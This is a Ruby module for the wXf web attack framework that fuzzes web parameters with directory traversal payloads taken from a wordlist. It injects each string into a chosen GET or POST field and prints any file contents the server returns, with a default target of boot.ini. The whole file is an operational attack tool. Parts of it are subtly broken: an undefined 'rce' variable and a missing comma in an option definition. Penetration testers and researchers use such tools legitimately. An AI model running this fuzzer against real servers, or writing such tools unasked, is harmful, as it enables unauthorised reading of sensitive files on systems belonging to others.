
class WebXploit <  WXf::WXfmod_Factory::Auxiliary

 
	include WXf::WXfassists::General::MechReq 
   
  
	def initialize
    		super( 
    'Name'        => 'Directory Traversal Fuzzer',
    'Version'     => '1.0',
    'Description' => %q{
    This modules fuzzes various directory traversal payloads against the
    specified URLs
                        },
    'References'  =>
     [
        [ 'URL', 'http://carnal0wnage.attackresearch.com/' ],
        [ 'URL', 'http://www.owasp.org/index.php/Testing_for_Path_Traversal']  
     ],
    'Author'      => [ 'CG' ],
    'License'     => WXF_LICENSE
              )
			init_opts([
				OptString.new('FILE',     [true, 'File To View', 'boot.ini']),
				OptString.new('LFILE', [true, 'Directory Traversal Strings File','wordlists/dir_traversal_strings.txt']),
				OptString.new('METHOD', [true, 'Choose either get or post', 'get']),
        OptString.new('RPARAMS', [false, 'POST ONLY - Enter the body like so: foo=bar&cow=moo', '']),
        OptString.new('FUZZPARAM', [false, 'POST ONLY - Identify which param is to be fuzzed' '']),
        OptString.new('LOG', [false,'If yes, the output will be logged in dradis upload format, under wXf/wXflog', 'no'])
        			])
	end

	
	def run
    dradis = WXf::WXflog::DradisLog.new({
      'Name' => "fuzzing 192.168.1.117",
      'Filename' => 'dir_trav_fuzz.xml'
     })
  
		fuzzparam = datahash['FUZZPARAM'] 
		file =  datahash['FILE']
		fuzzfile = datahash['LFILE']
		rparams = datahash['RPARAMS']  
    test_arry = []
		
      begin
			  check = File.open(fuzzfile)
			  check.each do |fuzztrav| 
			    string = fuzztrav.strip+file
		      new_rparams = nil
				    begin
              return prnt_err("Enter a parameter to fuzz (FUZZPARAM)") unless fuzzparam != ''
              return prnt_err("Enter a rparams (RPARAMS)") unless rparams != ''
				        if datahash['METHOD'].match(/(GET|get)/)
				          mod_params = convert_params("#{rparams}")
				          rhash = Hash[mod_params]
				            if rhash.has_key?(fuzzparam)
				              rhash[fuzzparam] = "#{string}"
				            end
				          res = mech_req({
				            'method'=> 'GET',
          		      'RURL'  =>  "#{rurl}",
       				      'PROXY_ADDR' => proxya,
       				      'PROXY_PORT' => proxyp,
       				      'RPARAMS' => rhash      				
							    })
				        elsif datahash['METHOD'].match(/(POST|post)/)
				          mod_params = convert_params("#{rparams}")
                  mod_params.each_with_index do |arry,idx|
                    if arry[0].match(/#{fuzzparam}/)
                      arry[1] = "#{string}"
                    end 
                  end
				          res = mech_req({
		                'method'=> 'POST',
                    'RURL'  =>  "#{rurl}",
                    'PROXY_ADDR' => proxya,
                    'PROXY_PORT' => proxyp,
                    'RPARAMS' => mod_params
                  })  
				       end

     		        if (res.nil?)
				          print_error("No response for #{rurl}#{string}")
     		        end	
     		 
     		        if	(res) and (res.respond_to?('code'))  and (res.code == '200')
     		          if datahash['LOG'] == 'yes'
     		            dradis.add_ritems([res.header, string, "#{res.body}"])
     		          end
     		         print_status("#{string}")
     		         print_status("Output Of Requested File:\n#{res.body}")
     		        end
				
                if (rce)
                  print_status("Received #{rce} for #{string}")
                end 
				   end #Second begin
			  end # do statement, where each string is enumerated 
      end  # First begin
     if datahash['LOG'] == 'yes'
       dradis.log
     end
   end #End of run method
        
end
